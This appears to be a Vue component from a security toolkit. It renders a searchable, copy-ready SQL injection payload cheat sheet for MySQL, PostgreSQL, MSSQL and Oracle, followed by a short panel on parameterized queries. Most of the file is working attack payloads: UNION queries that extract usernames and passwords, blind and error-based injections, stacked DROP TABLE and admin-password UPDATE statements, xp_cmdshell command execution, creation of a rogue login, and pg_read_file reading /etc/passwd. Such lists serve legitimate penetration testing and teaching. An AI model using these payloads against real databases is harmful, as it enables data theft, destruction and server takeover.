<template>
  <div class="space-y-4">
    <TabView :tabs="dbTypes">
      <template v-for="(db, idx) in dbTypes" :key="idx" #[`tab-${idx}`]>
        <div class="space-y-3">
          <div class="flex items-center gap-3">
            <input
              v-model="searchText"
              type="text"
              placeholder="搜索 SQL 注入模式..."
              class="flex-1 rounded-md border px-3 py-2 text-sm focus:outline-none"
              style="background-color: var(--color-bg-secondary); border-color: var(--color-border); color: var(--color-text);"
            />
            <span class="text-xs" style="color: var(--color-text-muted); white-space: nowrap;">
              {{ filteredPatterns(db).length }} 个
            </span>
          </div>

          <div class="space-y-3">
            <div v-for="(catGroup, cidx) in filteredPatterns(db)" :key="cidx">
              <p class="text-xs font-medium mb-2 px-1" style="color: var(--color-primary);">
                {{ catGroup.category }}
              </p>
              <div class="space-y-2">
                <div
                  v-for="(pattern, pidx) in catGroup.patterns"
                  :key="pidx"
                  class="reveal-item rounded-md border p-3"
                  :style="{ '--i': Math.min(pidx, 15), borderColor: 'var(--color-border)', backgroundColor: 'var(--color-bg-secondary)' }"
                >
                  <div class="flex items-start justify-between gap-2 mb-1">
                    <div class="flex-1 min-w-0">
                      <code class="text-sm font-mono break-all block" style="color: var(--color-text);">{{ pattern.code }}</code>
                    </div>
                    <CopyButton :text="pattern.code" />
                  </div>
                  <p class="text-xs mt-1" style="color: var(--color-text-muted);">{{ pattern.desc }}</p>
                </div>
              </div>
            </div>
          </div>

          <div v-if="filteredPatterns(db).length === 0 && searchText" class="text-center py-4">
            <p class="text-xs" style="color: var(--color-text-muted);">没有匹配的模式</p>
          </div>
        </div>
      </template>
    </TabView>

    <!-- Defense notes -->
    <div class="rounded-md border p-4" style="border-color: #bbf7d0; background-color: #f0fdf4;">
      <h3 class="text-sm font-medium mb-2" style="color: #166534;">防御建议：参数化查询</h3>
      <p class="text-xs mb-2" style="color: #166534;">
        永远不要使用字符串拼接来构建 SQL 查询。始终使用参数化查询（预编译语句）来防止 SQL 注入。
      </p>
      <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
        <div>
          <p class="text-xs font-medium mb-1" style="color: #166534;">Java (JDBC PreparedStatement)</p>
          <code class="text-xs font-mono block p-2 rounded" style="background-color: #dcfce7; color: #166534;">
            String sql = "SELECT * FROM users WHERE id = ?";<br/>
            PreparedStatement stmt = conn.prepareStatement(sql);<br/>
            stmt.setInt(1, userId);
          </code>
        </div>
        <div>
          <p class="text-xs font-medium mb-1" style="color: #166534;">Go (database/sql)</p>
          <code class="text-xs font-mono block p-2 rounded" style="background-color: #dcfce7; color: #166534;">
            row := db.QueryRow(<br/>
            &nbsp;&nbsp;"SELECT * FROM users WHERE id = ?",<br/>
            &nbsp;&nbsp;userId,<br/>
            )
          </code>
        </div>
        <div>
          <p class="text-xs font-medium mb-1" style="color: #166534;">Python (sqlite3/cursor)</p>
          <code class="text-xs font-mono block p-2 rounded" style="background-color: #dcfce7; color: #166534;">
            cursor.execute(<br/>
            &nbsp;&nbsp;"SELECT * FROM users WHERE id = ?",<br/>
            &nbsp;&nbsp;(userId,)<br/>
            )
          </code>
        </div>
        <div>
          <p class="text-xs font-medium mb-1" style="color: #166534;">Node.js (mysql2)</p>
          <code class="text-xs font-mono block p-2 rounded" style="background-color: #dcfce7; color: #166534;">
            await connection.execute(<br/>
            &nbsp;&nbsp;"SELECT * FROM users WHERE id = ?",<br/>
            &nbsp;&nbsp;[userId]<br/>
            )
          </code>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref } from 'vue';
import TabView from '../../common/TabView.vue';
import CopyButton from '../../common/CopyButton.vue';

interface Pattern { code: string; desc: string; }
interface CategoryGroup { category: string; patterns: Pattern[]; }

const searchText = ref('');

const dbTypes = ['MySQL', 'PostgreSQL', 'MSSQL', 'Oracle'];

const patterns: Record<string, CategoryGroup[]> = {
  'MySQL': [
    {
      category: 'UNION 注入',
      patterns: [
        { code: "' UNION SELECT 1,2,3-- -", desc: '基础 UNION SELECT，探测列数' },
        { code: "' UNION SELECT 1,@@version,3-- -", desc: '获取 MySQL 版本' },
        { code: "' UNION SELECT 1,user(),3-- -", desc: '获取当前用户' },
        { code: "' UNION SELECT 1,database(),3-- -", desc: '获取当前数据库名' },
        { code: "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -", desc: '枚举所有表名' },
        { code: "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -", desc: '枚举表的列名' },
        { code: "' UNION SELECT 1,group_concat(username,':',password),3 FROM users-- -", desc: '提取用户凭据' },
      ],
    },
    {
      category: '布尔盲注',
      patterns: [
        { code: "' AND 1=1-- -", desc: '真条件，页面正常' },
        { code: "' AND 1=2-- -", desc: '假条件，页面异常' },
        { code: "' AND SUBSTRING((SELECT database()),1,1)='a'-- -", desc: '逐字符猜测数据库名' },
        { code: "' AND ASCII(SUBSTRING((SELECT database()),1,1))>97-- -", desc: '用 ASCII 比较加速盲注' },
        { code: "' AND (SELECT COUNT(*) FROM information_schema.tables)>10-- -", desc: '判断表数量是否大于某值' },
      ],
    },
    {
      category: '时间盲注',
      patterns: [
        { code: "' AND SLEEP(5)-- -", desc: '延时 5 秒，验证注入点' },
        { code: "' AND IF(1=1,SLEEP(3),0)-- -", desc: '条件延时' },
        { code: "' AND IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(3),0)-- -", desc: '逐字符时间盲注' },
        { code: "' OR IF(ASCII(SUBSTRING((SELECT database()),1,1))>97,SLEEP(3),0)-- -", desc: 'ASCII 时间盲注' },
      ],
    },
    {
      category: '报错注入',
      patterns: [
        { code: "' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -", desc: 'ExtractValue 报错注入' },
        { code: "' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -", desc: 'UpdateXML 报错注入' },
        { code: "' AND (SELECT 1 FROM (SELECT COUNT(*),concat((SELECT database()),floor(rand()*2))x FROM information_schema.tables GROUP BY x)a)-- -", desc: 'Floor/Rand 双重查询报错注入' },
      ],
    },
    {
      category: '堆叠查询',
      patterns: [
        { code: "'; INSERT INTO users VALUES('hack','pass')-- -", desc: '堆叠 INSERT' },
        { code: "'; DROP TABLE users-- -", desc: '堆叠 DROP (危险，仅用于学习)' },
        { code: "'; UPDATE users SET password='newpass' WHERE username='admin'-- -", desc: '堆叠 UPDATE' },
      ],
    },
  ],
  'PostgreSQL': [
    {
      category: 'UNION 注入',
      patterns: [
        { code: "' UNION SELECT 1,2,3--", desc: '基础 UNION SELECT' },
        { code: "' UNION SELECT 1,version(),3--", desc: '获取 PostgreSQL 版本' },
        { code: "' UNION SELECT 1,current_user,3--", desc: '获取当前用户' },
        { code: "' UNION SELECT 1,current_database(),3--", desc: '获取当前数据库' },
        { code: "' UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables WHERE table_schema='public'--", desc: '列出 public schema 的表' },
        { code: "' UNION SELECT 1,string_agg(column_name,','),3 FROM information_schema.columns WHERE table_name='users'--", desc: '列出列名' },
      ],
    },
    {
      category: '布尔盲注',
      patterns: [
        { code: "' AND 1=1--", desc: '真条件' },
        { code: "' AND SUBSTRING(current_database(),1,1)='a'--", desc: '逐字符猜测数据库名' },
        { code: "' AND (SELECT length(current_database()))=5--", desc: '猜测数据库名长度' },
      ],
    },
    {
      category: '时间盲注',
      patterns: [
        { code: "'; SELECT pg_sleep(5)--", desc: 'PostgreSQL 延时盲注' },
        { code: "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--", desc: 'CASE 条件延时' },
      ],
    },
    {
      category: '报错注入',
      patterns: [
        { code: "'; SELECT cast(version() as numeric)--", desc: '类型转换报错' },
      ],
    },
    {
      category: '文件操作',
      patterns: [
        { code: "'; COPY (SELECT * FROM users) TO '/tmp/out.txt'--", desc: '复制数据到文件' },
        { code: "'; SELECT pg_read_file('/etc/passwd',0,1000)--", desc: '读取系统文件' },
      ],
    },
  ],
  'MSSQL': [
    {
      category: 'UNION 注入',
      patterns: [
        { code: "' UNION SELECT 1,2,3--", desc: '基础 UNION SELECT' },
        { code: "' UNION SELECT 1,@@version,3--", desc: '获取 MSSQL 版本' },
        { code: "' UNION SELECT 1,db_name(),3--", desc: '获取当前数据库名' },
        { code: "' UNION SELECT 1,STRING_AGG(table_name,','),3 FROM information_schema.tables--", desc: '枚举表名 (MSSQL 2017+)' },
        { code: "'; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES FOR XML PATH('')--", desc: 'XML PATH 拼接表名' },
      ],
    },
    {
      category: '布尔盲注',
      patterns: [
        { code: "' AND 1=1--", desc: '真条件' },
        { code: "' AND SUBSTRING(db_name(),1,1)='a'--", desc: '逐字符猜测数据库名' },
      ],
    },
    {
      category: '时间盲注',
      patterns: [
        { code: "'; WAITFOR DELAY '0:0:5'--", desc: 'MSSQL 延时 5 秒' },
        { code: "'; IF (1=1) WAITFOR DELAY '0:0:3'--", desc: '条件延时' },
      ],
    },
    {
      category: '报错注入',
      patterns: [
        { code: "'; SELECT 1/0--", desc: '除零报错' },
        { code: "' AND 1=CONVERT(int,@@version)--", desc: '类型转换报错' },
      ],
    },
    {
      category: '堆叠查询',
      patterns: [
        { code: "'; EXEC xp_cmdshell('whoami')--", desc: '执行系统命令 (需要 sa 权限)' },
        { code: "'; EXEC sp_addlogin 'hacker','password'--", desc: '创建登录账户' },
      ],
    },
  ],
  'Oracle': [
    {
      category: 'UNION 注入',
      patterns: [
        { code: "' UNION SELECT 1,2,3 FROM dual--", desc: '基础 UNION (Oracle 需要 FROM dual)' },
        { code: "' UNION SELECT 1,banner,3 FROM v$version--", desc: '获取 Oracle 版本' },
        { code: "' UNION SELECT 1,USER,3 FROM dual--", desc: '获取当前用户' },
        { code: "' UNION SELECT 1,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),3 FROM all_tables--", desc: '枚举所有表名' },
        { code: "' UNION SELECT 1,LISTAGG(column_name,','),3 FROM all_tab_columns WHERE table_name='USERS'--", desc: '枚举列名' },
      ],
    },
    {
      category: '布尔盲注',
      patterns: [
        { code: "' AND 1=1--", desc: '真条件' },
        { code: "' AND SUBSTR((SELECT banner FROM v$version),1,1)='O'--", desc: '逐字符盲注' },
        { code: "' AND (SELECT LENGTH(USER) FROM dual)=5--", desc: '猜测用户名长度' },
      ],
    },
    {
      category: '时间盲注',
      patterns: [
        { code: "' AND (SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END FROM dual)=1--", desc: 'Oracle 延时盲注' },
      ],
    },
    {
      category: '报错注入',
      patterns: [
        { code: "' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version))--", desc: 'CTXSYS 报错注入' },
        { code: "' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version))--", desc: 'UTL_INADDR 报错注入' },
      ],
    },
  ],
};

function filteredPatterns(db: string): CategoryGroup[] {
  const list = patterns[db] || [];
  if (!searchText.value.trim()) return list;
  const q = searchText.value.toLowerCase();
  return list
    .map(cat => ({
      category: cat.category,
      patterns: cat.patterns.filter(p =>
        p.code.toLowerCase().includes(q) || p.desc.toLowerCase().includes(q)
      ),
    }))
    .filter(cat => cat.patterns.length > 0);
}
</script>
